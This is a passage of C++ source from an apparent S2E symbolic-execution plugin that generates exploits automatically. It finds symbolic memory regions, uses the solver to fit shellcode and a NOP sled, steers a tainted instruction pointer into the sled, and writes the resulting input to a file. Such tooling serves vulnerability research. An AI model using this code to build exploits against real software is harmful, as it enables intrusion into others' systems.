	      //s2e()->getDebugStream(state) << "size " << op.second->size<< " ALL Concrete?: "<<op.second->isAllConcrete() << " offset " << (hostAddress & ~S2E_RAM_OBJECT_MASK) << std::hex << " address " << virtualAddress - (hostAddress & ~S2E_RAM_OBJECT_MASK) << " ~ "<< virtualAddress + (op.second->size - (hostAddress & ~S2E_RAM_OBJECT_MASK)) - 1<< " hostaddress: "<< hostAddress << " name: " << op.first->name << std::endl;

	      int size = op.second->size;
	      unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
	      virtualAddress = virtualAddress - offset;

	      //s2e()->getMessagesStream() << std::endl;                                         
	      //dumpStack(size/4,virtualAddress);
	      if(! op.second->isAllConcrete())
	      {   
		// state->dumpStack(size/4,virtualAddress);

		//for(unsigned int j=0 ; j<size ; j++)
		for(int j=size-1 ; j>=0 ; j--)
		{   
		  if(op.second->isByteKnownSymbolic(j))
		  {   
		    //s2e()->getDebugStream(state) << "1.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << std::endl;

		    int k=1;
		    //for(j=j+1; j<size ;j++)
		    for(j=j-1; j>=0 ;j--)
		    {   
		      if(! op.second->isByteKnownSymbolic(j))
		      {   
			break;
		      }   
		      k++;
		      //s2e()->getDebugStream(state) << "2.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << " j : "<< j << std::endl;
		    }   

		    //s2e()->getMessagesStream(state) << std::hex << sym_table.back().first << " == " << (virtualAddress + j) - k << std::endl;
		    if(!sym_table.empty() && (j+1) + k == size && virtualAddress + (j+1)+ k == sym_table.back().first )//sym_table.back().first == virtualAddress + j) 
		      //if(!sym_table.empty() && sym_table.back().first == virtualAddress + j) 
		      //if(!sym_table.empty() && (sym_table.back().first + sym_table.back().second) == (virtualAddress + j) - k ) 
		    {
		      //s2e()->getDebugStream(state) << "append " << std::hex << virtualAddress + (j + 1) << std::endl;
		      sym_table.back().first = virtualAddress + (j + 1)  ;
		      sym_table.back().second += k;
		    }
		    else
		    {
		      //s2e()->getDebugStream(state) << "add " << std::hex << (virtualAddress + j + 1) << std::endl;
		      std::pair<uint32_t, uint32_t> temp((virtualAddress + j + 1) , k);
		      sym_table.push_back(temp);

		    }
		  }
		}
	      }
	    }
	    virtualAddress = virtualAddress - 128;//size ;
	  }

	  std::vector<std::pair<uint32_t,uint32_t> >::iterator aa = sym_table.begin();
	  std::vector<std::pair<uint32_t,uint32_t> >::iterator bb = sym_table.end();

	  sort(aa, bb, my_sort);
	  //my_sort(aa,bb);


	  return sym_table;
	}

	std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchHeap(S2EExecutionState *s)
	{
	  return searchDown2Up(s, 0x08048000, 0xffffffff);
	}   

	std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchDown2Up(S2EExecutionState *state,  uint32_t start, uint32_t end)
	{


	  std::vector<std::pair<uint32_t,uint32_t> > sym_table;

	  //uint32_t virtualAddress = state->getSp();
	  //uint32_t virtualAddress = 0xbfffffff;
	  //uint32_t virtualAddress = 0x40000000;
	  //uint32_t virtualAddress = 0x08048000;
	  uint32_t virtualAddress = start;

	  uint64_t hostAddress = 0;

	  //std::vector<std::pair<uint32_t,uint32_t> >::iterator split;
	  //for(int i=0 ; i<5 ; i++)
	  while(hostAddress !=  (uint64_t) -1 && virtualAddress <= end)
	    //while(hostAddress !=  (uint64_t) -1)
	    //while(virtualAddress <= 0xbfffffff)
	  {   
	    hostAddress =  state->getHostAddress(virtualAddress);
	    if(hostAddress !=  (uint64_t) -1) 
	    {   
	      klee::ObjectPair op = state->addressSpace.findObject(hostAddress & S2E_RAM_OBJECT_MASK);
	      //s2e()->getDebugStream(state) << "size " << op.second->size<< " ALL Concrete?: "<<op.second->isAllConcrete() << " offset " << (hostAddress & ~S2E_RAM_OBJECT_MASK) << std::hex << " address " << virtualAddress - (hostAddress & ~S2E_RAM_OBJECT_MASK) << " ~ "<< virtualAddress + (op.second->size - (hostAddress & ~S2E_RAM_OBJECT_MASK)) - 1<< " hostaddress: "<< hostAddress << " name: " << op.first->name << std::endl;

	      unsigned int size = op.second->size;
	      unsigned int offset = (hostAddress & ~S2E_RAM_OBJECT_MASK);
	      virtualAddress = virtualAddress - offset;

	      //state->dumpStack(size/4,virtualAddress);
	      //   s2e()->getDebugStream(state) << "concreteMask: " << op.second->concreteMask.get(25) << std::endl;
	      if(! op.second->isAllConcrete())
	      {   
		// state->dumpStack(size/4,virtualAddress);

		for(unsigned int j=offset ; j<size && virtualAddress+j <= end ; j++)
		  //for(int j=size-1 ; j>=0 ; j--)
		{   
		  //s2e()->getDebugStream(state) << "concreteMask: " << j << " "<< op.second->concreteMask->get(j) << std::endl;
		  if(op.second->isByteKnownSymbolic(j))
		  {   
		    //s2e()->getDebugStream(state) << "1.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << std::endl;

		    unsigned int k=1;
		    for(j=j+1; j<size ;j++)
		      //for(j=j-1; j>=0 ;j--)
		    {   
		      //s2e()->getDebugStream(state) << "concreteMask: " << j << " "<< op.second->concreteMask->get(j) << std::endl;
		      if(! op.second->isByteKnownSymbolic(j))
		      {   
			break;
		      }   
		      k++;
		      //s2e()->getDebugStream(state) << "2.symbolic address: " << std::hex << virtualAddress + j << " " << state->readMemory8(virtualAddress + j) << " j : "<< j << std::endl;
		    }   

		    //s2e()->getMessagesStream(state) << std::hex << sym_table.back().first << " == " << (virtualAddress + j) - k << std::endl;
		    if(!sym_table.empty() && j == k && virtualAddress == sym_table.back().first + sym_table.back().second )//sym_table.back().first == virtualAddress + j) 
		      //if(!sym_table.empty() && sym_table.back().first == virtualAddress + j) 
		      //if(!sym_table.empty() && (sym_table.back().first + sym_table.back().second) == (virtualAddress + j) - k ) 
		    {
		      //s2e()->getDebugStream(state) << "append " << std::hex << sym_table.back().first  << " "  << sym_table.back().second + k << std::endl;
		      //sym_table.back().first = virtualAddress  ;
		      sym_table.back().second += k;
		    }
		    else
		    {
		      //s2e()->getDebugStream(state) << "add " << std::hex << virtualAddress + j -k  << " " << k << std::endl;
		      std::pair<uint32_t, uint32_t> temp((virtualAddress + j -k) , k);
		      sym_table.push_back(temp);

		    }
		  }
		}
	      }
	    }
	    else
	    {
	      //s2e()->getMessagesStream(state) << "NO~ " << std::hex << virtualAddress << std::endl;
	    }
	    virtualAddress = virtualAddress + 128;//size ;
	  }

	  std::vector<std::pair<uint32_t,uint32_t> >::iterator aa = sym_table.begin();
	  std::vector<std::pair<uint32_t,uint32_t> >::iterator bb = sym_table.end();

	  sort(aa, bb, my_sort);
	  //my_sort(aa,bb);


	  return sym_table;


	}

	std::vector<std::pair<uint32_t,uint32_t> > Exploit::searchDataOrHeap(S2EExecutionState *state, bool which)
	{
	  //uint32_t start = 0x804809c;
	  //uint32_t size = 0x80480a8;

	  //s2e()->getMessagesStream(state) << "Data segment : "<< std::hex << state->readMemory(start, klee::Expr::Int32) <<  " size: " << state->readMemory(size, klee::Expr::Int32) << std::endl;
	  /*
	     uint32_t offset = expr2uint32(state->readMemory(0x804801c, klee::Expr::Int32));
	  //uint32_t offset = CE->getZExtValue();
	  s2e()->getDebugStream(state) << "offset : " << std::hex  <<offset << std::endl;

	  offset = offset + 0x8048000;

	  int num = 0;

	  while(0x1 != expr2uint32(state->readMemory(offset, klee::Expr::Int32)) 
	  || 0x8048000 == expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32)))// && offset <= 0x8048100)
	  {
	  if(0x1 == expr2uint32(state->readMemory(offset, klee::Expr::Int32)))
	  num = 1;
	  offset = offset + 0x20;
	  }
	   */
	  uint32_t start;// = expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32));
	  uint32_t size;// = expr2uint32(state->readMemory(offset+0x14, klee::Expr::Int32));
	  getDataSeg(state, &start, &size);
	  s2e()->getDebugStream(state) << "data segment : " << std::hex  << start << " size : " << size << std::endl;
	  //std::vector<std::pair<uint32_t,uint32_t> > sym_table;
	  //return sym_table;
	  if(which == true)
	    return searchDown2Up(state, start, start+size);
	  else
	    return searchDown2Up(state, start+size, 0xffffffff);
	}

	inline uint8_t expr2uint8(klee::ref<klee::Expr> expr)
	{
	  klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (expr);
	  return CE->getZExtValue();                                   

	}

	inline uint32_t Exploit::expr2uint32(klee::ref<klee::Expr> expr)
	{
	  klee::ConstantExpr *CE = dyn_cast<klee::ConstantExpr> (expr);
	  return CE->getZExtValue();
	}


	std::vector<unsigned char> Exploit::getShellcode(S2EExecutionState *state, std::string shellcode)
	{
	  std::vector<unsigned char> code;

	  char *c_shellcode = new char [shellcode.size() + 1];

	  strcpy(c_shellcode, shellcode.c_str());
	  char *p = strtok(c_shellcode, "x");

	  while(p != NULL)
	  {
	    code.push_back(strtol(p, NULL, 16));
	    //s2e()->getWarningsStream(state) << strtol(p, NULL, 16) << std::endl;
	    p = strtok(NULL, "x");
	  }


	  return code;
	}

	int Exploit::testShellcode(S2EExecutionState *state, uint32_t address, std::vector<unsigned char> shellcode, klee::ConstraintManager cm, klee::ref<klee::Expr> tainted_ptr, uint32_t tainted_value ,uint32_t nop_end, unsigned char nop_value)
	{
	  int size = shellcode.size();
	  int i;


	  //s2e()->getWarningsStream(state) << "address: " << address << std::endl;
	  //klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( eip_value, klee::ConstantExpr::alloc(0xffffffff ,klee::Expr::Int32));
	  //bool res;                             
	  //klee::Solver::Validity res;                             
	  //klee::Query query(cm, one_byte);        
	  //s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

	  //s2e()->getMessagesStream(state) << "res : " << res << std::endl;

	  klee::ref<klee::Expr> all = klee::ConstantExpr::create(0x1,klee::Expr::Bool);

	  for(i=0 ; i<size ; i++)
	  {
	    klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( state->readMemory8(address + i), klee::ConstantExpr::create(shellcode[i] ,klee::Expr::Int8));


	    all = klee::AndExpr::create(all, one_byte);
	    //s2e()->getMessagesStream(state) << state->readMemory8(address + i) << std::endl;
	    //  state->addConstraint(one_byte);

	    //bool res;
	    //klee::Solver::Validity res;
	    //klee::Query query(cm, one_byte);
	    //s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);
	    //s2e()->getExecutor()->getSolver()->evaluate(query, res);

	    //	if(res == false)
	    //if(res == klee::Solver::False)
	    //	{
	    //return false;
	    //	  s2e()->getDebugStream(state) << "insert shellcode error! " << one_byte << std::endl;
	    //	  return -1;
	    //	}
	    //	else
	    //	{
	    //cm.concolicSize = 0;
	    /*           std::vector< klee::ref<klee::Expr> >::const_iterator it = state->constraints.begin(); 
			 for(; it != state->constraints.end() ;it++)                               
			 {                                                                         
			 s2e()->getWarningsStream(state) << "constraint : " << *it << std::endl; 
			 }*/                                                                         
	    //s2e()->getDebugStream(state) << "insert shellcode ok! " << one_byte << std::endl;
	    //	  cm.addConstraint(one_byte);
	    //	}
	  }

	  bool res;
	  klee::Query query(cm, all/*klee::ConstantExpr::create(0x1,klee::Expr::Bool)*/);
	  s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

	  //cm.addConstraint(all);
	 /* 
	     std::vector< klee::ref<klee::Expr> >::const_iterator it = cm.begin(); 
	     for(; it != cm.end() ;it++)                               
	     {                                                                         
	     s2e()->getWarningsStream(state) << "constraint : " << *it << std::endl; 
	     }                                                                         


	     s2e()->getWarningsStream(state) << "all: " << all << std::endl;
	   
	     s2e()->getWarningsStream(state) << "res : " << res  << " address : " << address<< std::endl;
         */
	  if(res == true)
	  {
	    if(type==3 || where == 4)
	      return 0;

	    cm.addConstraint(all);

	    /*        
		      klee::ref<klee::Expr>  low = klee::UgeExpr::create(tainted_ptr, klee::ConstantExpr::create(nop_end ,klee::Expr::Int32));
		      klee::ref<klee::Expr>  up = klee::UleExpr::create(tainted_ptr, klee::ConstantExpr::create(address ,klee::Expr::Int32));
		      klee::ref<klee::Expr> eip_range = klee::EqExpr::create(low, up);

		      klee::Query query(cm, eip_range);
		      s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);  

		      if(res == false)
		      return -1;
	     */
	    //klee::ref<klee::Expr> eip_range

	    //if( !testPointer(state, cm,  tainted_ptr, address))
	    //  return -1;
	  }
	  else
	    return -1;

	  return  testAndGetNopSize(state, cm, address, nop_end, nop_value, tainted_ptr, tainted_value);

	  //return nop_size;
	  /*
	     if(tainted_ptr.compare(eip_value))
	     {
	     s2e()->getMessagesStream(state) << "tainted_ptr != eip_value" << std::endl;

	     klee::ref<klee::Expr> new_eip =  klee::EqExpr::create( eip_value, klee::ConstantExpr::create(tainted_address ,klee::Expr::Int32));
	     klee::Solver::Validity res;
	     klee::Query query(cm, new_eip);
	     s2e()->getExecutor()->getSolver()->evaluate(query, res); 

	     if(res == klee::Solver::False)
	     return -1;
	     else
	     cm.addConstraint(new_eip);

	     }
	   */
	  //if(testPointer(state, cm,  tainted_ptr, address - (nop_size/2)))
	  //  return nop_size;
	  // else
	  //   return -1;

	  //klee::ref<klee::Expr> new_tainted_ptr =  klee::EqExpr::create( tainted_ptr, klee::ConstantExpr::create(address ,klee::Expr::Int32));
	  //s2e()->getMessagesStream(state) << eip_value << std::endl;
	  //bool res;
	  //klee::Solver::Validity res;
	  //klee::Query query(cm, new_tainted_ptr);
	  //s2e()->getExecutor()->getSolver()->mayBeFalse(query, res);
	  //s2e()->getExecutor()->getSolver()->evaluate(query, res);
	  //s2e()->getMessagesStream(state) << "res : " << res << std::endl;


	  //return res != klee::Solver::False;
	  //return res != true;
	}

	bool Exploit::testPointer(S2EExecutionState *state, klee::ConstraintManager cm,  klee::ref<klee::Expr> target_ptr, uint32_t value)
	{
	  /*
	     klee::ref<klee::Expr> right, left;

	  //right = value;
	  //while(value.get()->getKind() == klee::Expr::Concat)
	  // {
	  left = dyn_cast<klee::ConcatExpr>(value)->getLeft();
	  right = dyn_cast<klee::ConcatExpr>(value)->getRight();
	  s2e()->getWarningsStream(state) << left->getKind() << std::endl;

	  if(left->getKind() == klee::Expr::Constant)
	  return false;

	  left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
	  right = dyn_cast<klee::ConcatExpr>(right)->getRight();
	  s2e()->getWarningsStream(state) << left->getKind() << std::endl;

	  left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
	  right = dyn_cast<klee::ConcatExpr>(right)->getRight();
	  s2e()->getWarningsStream(state) << left->getKind() << std::endl;

	  //left = dyn_cast<klee::ConcatExpr>(right)->getLeft();
	  //right = dyn_cast<klee::ConcatExpr>(right)->getRight();
	  s2e()->getWarningsStream(state) << right->getKind() << std::endl;
	  //break;
	  //}

	   */
	  klee::ref<klee::Expr> new_eip =  klee::EqExpr::create(target_ptr, klee::ConstantExpr::create(value ,klee::Expr::Int32));

	  if(target_ptr.compare(eip_value))
	  {
	    //s2e()->getMessagesStream(state) << "tainted_ptr != eip_value" << std::endl;
	    klee::ref<klee::Expr> temp = klee::EqExpr::create(eip_value, klee::ConstantExpr::create(tainted_address ,klee::Expr::Int32));
	    new_eip = klee::AndExpr::create(new_eip, temp);
	  }
	  bool res;
	  //klee::Solver::Validity res;                             
	  klee::Query query(cm, new_eip);        
	  //s2e()->getExecutor()->getSolver()->evaluate(query, res);
	  s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

	  //s2e()->getDebugStream(state) << "[*] test pointer ? " << res << " " << new_eip  << std::endl;

	  return res != false/*klee::Solver::False*/;                          


	}

	int Exploit::testAndGetNopSize(S2EExecutionState *state, klee::ConstraintManager cm, uint32_t start, uint32_t end, unsigned char nop_value, klee::ref<klee::Expr> tainted_ptr, uint32_t tainted_value)
	{
	  uint32_t min = end;
	  uint32_t max = start;
	  uint32_t mid = min + (max-min)/2;

	  int nop_size = -1;

	  while(min <= max)
	  {
	    klee::ref<klee::Expr>  low = klee::UgeExpr::create(tainted_ptr, klee::ConstantExpr::create(mid ,klee::Expr::Int32));
	    klee::ref<klee::Expr>  up = klee::UleExpr::create(tainted_ptr, klee::ConstantExpr::create(start ,klee::Expr::Int32)); 
	    klee::ref<klee::Expr> eip_range = klee::EqExpr::create(low, up);                                                        
	    bool res;                                                                                                                
	    klee::Query query(cm, eip_range);                                                                                       
	    s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);                                                               

	    if(res == true)                                                                                                        
	    {
	      klee::ref<klee::Expr> all = klee::ConstantExpr::create(0x1,klee::Expr::Bool);                                                                                    
	      for(uint32_t address = start-1 ; address >= mid ; address--)                                                
	      {                                                                                                                                          
		klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address), klee::ConstantExpr::create(nop_value ,klee::Expr::Int8));
		all = klee::AndExpr::create(all, nop);                                                                                                   
	      }                                                                                                                                          
	      all = klee::AndExpr::create(all, eip_range);
	      klee::Query  qq(cm, all);
	      s2e()->getExecutor()->getSolver()->mayBeTrue(qq, res);
	      if(res == true)
	      {
		nop_size = start - mid;
		max = mid - 1;
	      }
	      else
	      {
		min = mid + 1;
	      }
	    }
	    else
	    {
	      max = mid - 1;
	    }

	    mid = min + (max-min)/2;
	  }

	  return nop_size;

	  ///////////////////////////////////////////////////////////////////////////

	  klee::ref<klee::Expr> all;
	  while(min <= max)
	  {
	    all = klee::ConstantExpr::create(0x1,klee::Expr::Bool);
	    for(uint32_t address = start-1 ; address >= (mid = (max - (max-min)/2))/*mid*/ ; address--)
	    {
	      klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address), klee::ConstantExpr::create(nop_value ,klee::Expr::Int8));
	      all = klee::AndExpr::create(all, nop);
	    }
	    bool res;
	    /*
	       klee::ref<klee::Expr>  nop_low = klee::UgeExpr::create(tainted_ptr, klee::ConstantExpr::create(mid ,klee::Expr::Int32));
	       klee::ref<klee::Expr>  nop_up = klee::UleExpr::create(tainted_ptr, klee::ConstantExpr::create(start ,klee::Expr::Int32)); 
	       klee::ref<klee::Expr> nop_range = klee::EqExpr::create(nop_low, nop_up);                                                        
	       all = klee::AndExpr::create(all, nop_range);
	     */
	    klee::Query query(cm, all);
	    s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);

	    //s2e()->getMessagesStream(state) << "test nop: " << std::hex << max << " ~ " << mid << " ~ " << min << " res: " << res << " all: " << all << std::endl;

	    if(res == true)
	    {
	      max = mid - 1;
	    }
	    else
	    {
	      min = mid + 1;
	    }
	  }     

	  //s2e()->getMessagesStream(state) << "min: " << std::hex << min << " num: " << start-min << std::endl;
	  int num = start - min; 
	  cm.addConstraint(all);
	  //std::vector< klee::ref<klee::Expr> >::const_iterator it = cm.begin();    
	  //for(; it != cm.end() ;it++)                                              
	  //{                                                                        
	  //  s2e()->getWarningsStream(state) << "constraint : " << *it << std::endl;
	  //}                                                                        

	  //Nop
	  //uint32_t nop_address;
	  //      uint32_t address;
	  //      int num = 0;
	  //      for( address = start - 1; address >= end ; address--)
	  //      {
	  //	klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address), klee::ConstantExpr::create(nop_value ,klee::Expr::Int8));
	  //klee::Solver::Validity res;      
	  //        bool res;          
	  //	klee::Query query(cm, nop);
	  //s2e()->getExecutor()->getSolver()->evaluate(query, res);
	  //	s2e()->getExecutor()->getSolver()->mayBeTrue(query, res);
	  //s2e()->getMessagesStream(state) << "nop: " << std::hex << start << " res: " << res <<std::endl;

	  //	if(res != false/*klee::Solver::False*/)
	  //	{
	  //state->addConstraint(nop);
	  //cm.concolicSize = 0;
	  //	  cm.addConstraint(nop);
	  //    if(testPointer(state, cm,  tainted_ptr, start - ((num+1)/2)))
	  //	  num++;
	  //    else
	  //      break;
	  //	}
	  //	else
	  //	  break;
	  //      } 

	  //address = address + 1;



	  while(num >= 0)
	  {
	    //s2e()->getDebugStream(state) << "num = " << num  << std::endl;
	    if(testPointer(state, cm,  tainted_ptr, /*start*/ tainted_value - (num/2)))
	      break;
	    else
	    {
	      if(num>0)
	      {
		cm.pop_back();
		num--;

		if(num!=0 && num % 2 == 0)
		{
		  cm.pop_back(); 
		  num--;      
		}
	      }
	    }
	  }

	  return num;

	}

	void Exploit::addConstraints(S2EExecutionState *state, uint32_t address, std::vector<unsigned char> shellcode, klee::ref<klee::Expr> tainted_ptr,uint32_t tainted_value, unsigned char nop_value, int nop_size)
	{
	  //unsigned int i;
	  klee::ref<klee::Expr> all = klee::ConstantExpr::create(0x1,klee::Expr::Bool);

	  for(unsigned int i=0 ; i<shellcode.size(); i++)
	  {
	    klee::ref<klee::Expr> one_byte =  klee::EqExpr::create( state->readMemory8(address + i), klee::ConstantExpr::create(shellcode[i] ,klee::Expr::Int8));
	    all = klee::AndExpr::create(all, one_byte);;
	    //state->addConstraint(one_byte);
	  }
	  for(unsigned int i=0 ; i< (unsigned)nop_size ; i++)
	  {
	    klee::ref<klee::Expr> nop =  klee::EqExpr::create( state->readMemory8(address - i - 1), klee::ConstantExpr::create(nop_value ,klee::Expr::Int8));
	    all = klee::AndExpr::create(all, nop);
	    //state->addConstraint(nop);
	  }
	  //        s2e()->getWarningsStream(state) << "oh~ my~ god~" << std::endl;        

	  //    if(0)
	  if(tainted_ptr.compare(eip_value))
	  {
	    //s2e()->getWarningsStream(state) << "tainted_ptr != eip_value" << std::endl;        
	    klee::ref<klee::Expr> new_eip =  klee::EqExpr::create( eip_value, klee::ConstantExpr::create(tainted_address, klee::Expr::Int32));
	    all = klee::AndExpr::create(all, new_eip);
	    //state->addConstraint(new_eip);

	  }


	  state->addConstraint(all); 


	  if(type == 3)
	  {
	    klee::ref<klee::Expr> type3_eip =  klee::EqExpr::create( eip_value, klee::ConstantExpr::create(tainted_value, klee::Expr::Int32));      
	    state->addConstraint(type3_eip);
	    return;
	  }
	  ///////////////////////////////////////find the location of the eip in nop//////////////////////////////////////////////////////// 
	  int range = 0;
	  bool res = 0; 
	  uint32_t mid = tainted_value - (nop_size/2);
	  //klee::ref<klee::ConstantExpr> value;    
	  klee::ref<klee::Expr> eip_range;        

	  while(res == 0)
	  {
	    klee::ref<klee::Expr> up = klee::UleExpr::create(tainted_ptr, klee::ConstantExpr::create(mid+range <= tainted_value ? mid+range : tainted_value ,klee::Expr::Int32));

	    klee::ref<klee::Expr> down;

	    if(nop_size % 2 == 0)
	      down = klee::UgeExpr::create(tainted_ptr, klee::ConstantExpr::create(mid-range >= tainted_value-nop_size ? mid-range : tainted_value-nop_size ,klee::Expr::Int32));
	    else
	      down = klee::UgeExpr::create(tainted_ptr, klee::ConstantExpr::create(mid-range-1 >= tainted_value-nop_size ? mid-range-1 : tainted_value-nop_size,klee::Expr::Int32));

	    eip_range = klee::AndExpr::create(up, down);
	    //state->addConstraint(eip_range); 
	    //success = s2e()->getExecutor()->getSolver()->getValue(klee::Query(state->constraints, tainted_ptr), value); 
	    s2e()->getExecutor()->getSolver()->mayBeTrue(klee::Query(state->constraints, eip_range), res);

	    //s2e()->getWarningsStream(state) << std::hex  << up << " ~ " << down << " (res): " << res << std::endl;

	    //s2e()->getWarningsStream(state) << "### eip value : " << value << std::endl;
	    if(range == 0 )
	      range = 1; 
	    else
	      range = range * 2;
	  }

	  state->addConstraint(eip_range);

	  //klee::ref<klee::Expr> new_tainted_ptr =  klee::EqExpr::create( tainted_ptr, klee::ConstantExpr::create(/*address*/tainted_value  - (nop_size/2),klee::Expr::Int32));
	  //      klee::ref<klee::Expr> new_tainted_ptr =  klee::EqExpr::create( tainted_ptr, value);
	  //state->addConstraint(new_tainted_ptr);
	  //      all = klee::AndExpr::create(all, new_tainted_ptr);

	  //      state->addConstraint(all);

	}

	int Exploit::getMaxNopAndAddr(S2EExecutionState *state, std::vector<unsigned char> shellCodeVector, std::vector<std::pair<uint32_t,uint32_t> > sym_table, klee::ref<klee::Expr> tainted_ptr, unsigned char nop_value, const char where[], uint32_t *address)
	{
	  *address = 0;
	  int nop_size = -1;
	  /*
	     for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)
	     {
	     for(uint32_t i=it->first ; i < i+it->second ; i++)
	     {
	     if(!eip_value.compare(state->readMemory(i), klee::Expr::Int32))
	     s2e()->getMessagesStream(state) << "eip---> " << std::hex << i << std::endl;
	     }
	     }
	   */
	  for(std::vector<std::pair<uint32_t,uint32_t> >::iterator it = sym_table.begin() ;  it != sym_table.end() ; it++)                                
	  {                                                                                                                                               
	    if(it->second > shellCodeVector.size() + nop_size)  
	    {                                                                                                                                             
	      //s2e()->getMessagesStream(state) << where <<" : symbolic address: " << std::hex << it->first << " size: " << std::dec << it->second << std::endl;

	      uint32_t shell_start_address = it->first + it->second - shellCodeVector.size(); 
              if(type == 2)
                shell_start_address = shell_start_address + 1;    

	      while(shell_start_address >= it->first)                                                                                                    
	      {                                                                                                                                     
		int temp = testShellcode(state, shell_start_address , shellCodeVector, state->constraints, tainted_ptr, shell_start_address, it->first, nop_value);     
		//s2e()->getMessagesStream(state) << "shell_start_address: " << shell_start_address << " temp: " << temp << std::endl;
		if(-1 != temp)                                                 
		{                                                                                                                                         
		  //s2e()->getMessagesStream(state) << "YYYYYYYYYYYYYYYYYYYYYYYYYYYAAAAAAAAAAAAAAAAAAAA!!! " << std::hex  << shell_address << std::endl;  
		  //int temp;
		  if(nop_size < temp)                                                                    
		  {                                                                                                                                       
		    *address = shell_start_address;                                                                                                      
		    nop_size = temp;//getNopSize(state, shell_start_address, it->first);                                       
		  }        
		  //s2e()->getDebugStream(state) <<  "((" <<shell_start_address << "-" << temp << ") - " << it->first<< ") "<< " <= " << (shellCodeVector.size() + nop_size) << std::endl;
		  if(((shell_start_address - temp) - it->first) <= (shellCodeVector.size() + nop_size))                                                       
		    break;             
		  else
		    shell_start_address = shell_start_address - temp; 
		}                                                                                                                                         
		shell_start_address--;   
	      }                                                                                                                                         
	      //s2e()->getMessagesStream(state) << where <<" : symbolic address: " << std::hex << it->first << " size: " << std::dec << it->second << " ... nop size: "<< nop_size << std::endl;
	    }                                                                                                                                             
	    else                                                                                                                                          
	      break;                                                                                                                                      
	  } 

	  if(nop_size != -1)     
	    s2e()->getWarningsStream(state) << "[*] ---> Address: " << std::hex <<  *address << " (" << where << ") nopsize: "<< std::dec << nop_size << std::endl;

	  return nop_size;                                                                                                                                   
	}

	void Exploit::getDataSeg(S2EExecutionState *state, uint32_t *start, uint32_t *size)
	{
	  uint32_t offset = expr2uint32(state->readMemory(0x804801c, klee::Expr::Int32));                             
	  //uint32_t offset = CE->getZExtValue();                                                                     
	  //s2e()->getDebugStream(state) << "offset : " << std::hex  <<offset << std::endl;                             

	  offset = offset + 0x8048000;                                                                                

	  int num = 0;                                                                                                

	  while(0x1 != expr2uint32(state->readMemory(offset, klee::Expr::Int32))                                      
	      || 0x8048000 == expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32)))// && offset <= 0x8048100)
	      {                                                                                                       
		if(0x1 == expr2uint32(state->readMemory(offset, klee::Expr::Int32)))                                  
		  num = 1;                                                                                            
		offset = offset + 0x20;                                                                               
	      }                                                                                                       

	  *start = expr2uint32(state->readMemory(offset+0x8, klee::Expr::Int32));                             
	  *size = expr2uint32(state->readMemory(offset+0x14, klee::Expr::Int32));                             

	}

	void Exploit::genExploit(S2EExecutionState *state, char * filename)
	{
	  ConcreteInputs out;                                               
	  bool success = s2e()->getExecutor()->getSymbolicSolution(*state, out);

	  if(success)
	  {
	    char * path = const_cast<char*> ( s2e()->getOutputFilename(filename).c_str());
	    std::ofstream fout(path, std::ios::out | std::ios::binary);               

	    ConcreteInputs::iterator it;                                              
	    for (it = out.begin(); it != out.end(); ++it)
	    {                           
	      const VarValuePair &vp = *it;                                           

	      for (unsigned i=0; i<vp.second.size(); ++i)
	      {                           
		fout.put((unsigned) vp.second[i]);                                    
	      }                                                                       
	    }                                                                         
	    fout.close();                                        

	  }        
	  s2e()->getWarningsStream(state) << "[*] Generated Exploit. (" << filename << ")"<< std::endl;

	  state->end = times(&(state->t_end));
	  long tps = sysconf(_SC_CLK_TCK); 
	  s2e()->getWarningsStream(state) << " === start -> middle ==="<< std::endl;
	  s2e()->getWarningsStream(state) << "elpapsed : " << std::fixed << std::setprecision(5) << (float)(state->middle - state->start)/tps << std::endl;
	  s2e()->getWarningsStream(state) << "parent time (user CPU) : " << (float)(state->t_middle.tms_utime - state->t_start.tms_utime)/tps << std::endl;
	  s2e()->getWarningsStream(state) << "parent time (sys CPU) : " << (float)(state->t_middle.tms_stime - state->t_start.tms_stime)/tps << std::endl;
	  s2e()->getWarningsStream(state) << "child time (user CPU) : " << (float)(state->t_middle.tms_cutime - state->t_start.tms_cutime)/tps << std::endl;
	  s2e()->getWarningsStream(state) << "child time (sys CPU) : " << (float)(state->t_middle.tms_cstime - state->t_start.tms_cstime)/tps << std::endl;

	  s2e()->getWarningsStream(state) << " === start -> end ==="<< std::endl;
	  s2e()->getWarningsStream(state) << "elpapsed : " << std::fixed << std::setprecision(5) << (float)(state->end - state->start)/tps << std::endl;
	  s2e()->getWarningsStream(state) << "parent time (user CPU) : " << (float)(state->t_end.tms_utime - state->t_start.tms_utime)/tps << std::endl;
	  s2e()->getWarningsStream(state) << "parent time (sys CPU) : " << (float)(state->t_end.tms_stime - state->t_start.tms_stime)/tps << std::endl;
	  s2e()->getWarningsStream(state) << "child time (user CPU) : " << (float)(state->t_end.tms_cutime - state->t_start.tms_cutime)/tps << std::endl;
	  s2e()->getWarningsStream(state) << "child time (sys CPU) : " << (float)(state->t_end.tms_cstime - state->t_start.tms_cstime)/tps << std::endl;

          s2e()->getExecutor()->terminateStateEarly(*state,"Exploit plugin terminate");
	  exit(0);                                                                             

	}

      } // namespace plugins
    } // namespace s2e
